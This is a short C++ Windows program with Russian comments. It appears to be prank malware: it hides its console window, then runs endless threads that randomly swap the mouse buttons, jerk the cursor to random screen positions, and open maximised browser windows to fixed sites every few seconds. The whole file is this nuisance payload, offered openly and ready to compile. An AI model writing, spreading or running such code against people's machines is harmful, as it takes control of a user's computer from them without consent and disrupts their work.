#include <iostream>
#include <Windows.h>
#include <vector>

void swapMouse() {
	std::srand(std::time(nullptr));

	while (true) {
		Sleep(100);
		bool value = std::rand() % 2;
		SwapMouseButton(value); // Свапаем кнопки мыши.
	}

}

void setCursor() {
	std::srand(std::time(nullptr));

	while (true) {
		Sleep(50);

		int x = rand() % 500;
		int y = rand() % 500;
		SetCursorPos(x, y); // Устанавливаем курсор не в то положение, в котором его хотел бы видеть пользователь) 
	}
	
}

void openURL() {
	std::vector<std::wstring> url = {L"http://www.google.com", L"https://www.youtube.com/", L"https://wasm.in/", L"https://habr.com/"};
	std::srand(std::time(nullptr));

	while (true) {
		Sleep(3000);
		int value = rand() % url.size();
		ShellExecute(0, L"open", url[value].c_str(), NULL, NULL, SW_SHOWMAXIMIZED);
	}


}

int main() {

	FreeConsole(); 

	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&swapMouse, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&setCursor, NULL, NULL, NULL);
	CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&openURL, NULL, NULL, NULL);
	
	while (true) {}

	return 0;
}